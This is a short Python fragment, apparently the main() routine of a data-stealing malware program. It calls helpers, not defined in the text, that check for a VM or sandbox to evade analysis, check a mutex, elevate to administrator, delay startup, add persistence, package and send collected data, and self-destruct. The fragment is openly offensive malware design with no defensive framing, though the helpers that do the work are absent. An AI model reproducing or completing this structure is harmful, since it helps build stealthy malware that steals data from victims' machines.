def main():
    # VM/Sandbox check
    if check_vm() or check_sandbox():
        return
    
    # Mutex check
    check_mutex()
    
    # Admin elevation
    elevate_admin()
    
    # Startup delay
    startup_delay(30)
    
    # Persistence
    add_persistence()
    
    # Collect and send data
    package_and_send_data()
    
    # Self-destruct if enabled
    self_destruct()

if __name__ == "__main__":
    main()
